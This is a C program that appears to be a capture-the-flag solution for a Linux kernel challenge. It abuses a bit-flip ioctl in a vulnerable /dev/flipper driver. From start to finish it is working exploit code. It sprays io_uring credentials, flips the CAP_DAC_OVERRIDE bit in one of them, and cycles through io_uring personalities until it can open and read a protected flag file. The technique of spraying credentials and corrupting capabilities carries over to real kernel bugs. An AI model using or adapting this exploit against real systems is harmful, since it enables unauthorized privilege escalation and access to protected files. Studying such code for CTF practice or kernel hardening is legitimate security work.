#define _GNU_SOURCE

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include "io_uring.h"
#include "cred.h"
#include "util.h"

#define CMD_ALLOC 0x13370000
#define CMD_FLIP  0x13370001

int main(void)
{
    int ffd, rootfd;

    // 0. prep stuff
    if ((ffd = open("/dev/flipper", O_RDONLY)) < 0) {
        fatal("[!] open /dev/flipper");
    }
    if ((rootfd = open("/", O_RDONLY | O_DIRECTORY)) < 0) {
        fatal("[!] open /");
    }

    struct submitter uring_cred;
    app_setup_uring(&uring_cred, 0x80);

    // 1. prep base alloc
    if (ioctl(ffd, CMD_ALLOC, 0xc0)) {
        fatal("[!] ioctl CMD_ALLOC");
    }

    // 2. spray creds
    printf("[*] spraying 0xffff creds\n");
    alloc_n_creds(uring_cred.ring_fd, 0xffff);

    // 3. flip one of the cred's capability
    int ofs = (0xffff * 0xc0 / 2) & ~0xfff; // offset into io_uring cred sprays
    ofs += 56;                              // cap_effective @ cred + 56
    ofs <<= 3;
    ofs += 1;                               // CAP_DAC_OVERRIDE
    printf("[*] flip bit offset: 0x%x\n", ofs);

    if (ioctl(ffd, CMD_FLIP, ofs)) {
        fatal("[!] ioctl CMD_FLIP");
    }

    // 4. attempt to open with elevated permissions
    struct io_uring_sqe sqe;
    memset(&sqe, 0, sizeof(sqe));
    sqe.opcode = IORING_OP_OPENAT;
    sqe.fd = rootfd;
    sqe.addr = (__u64)"flag";
    sqe.open_flags = O_RDWR;    // we're using CAP_DAC_OVERRIDE, file permissions don't matter
    sqe.len = 0;
    sqe.file_index = 0;

    printf("[*] scan through all creds\n");
    int reaped_success = 0, reap_cnt = 0, flag_fd;
    for (int i = 0; i < 0xffff && !reaped_success; i++) {
        reap_cnt++;
        sqe.personality = i + 1;
        submit_to_sq(&uring_cred, &sqe, 1, 1);
        read_from_cq(&uring_cred, false, &reaped_success, &flag_fd);
    }
    if (!reaped_success) {
        fatal("[!] flag open fail (cred not hit)");
    }
    printf("[+] flag opened w/ cred 0x%x, flag fd: %d\n", reap_cnt, flag_fd);

    // 5. read flag
    char buf[0x100];
    write(STDIN_FILENO, buf, read(flag_fd, buf, sizeof(buf)));

    return 0;
}
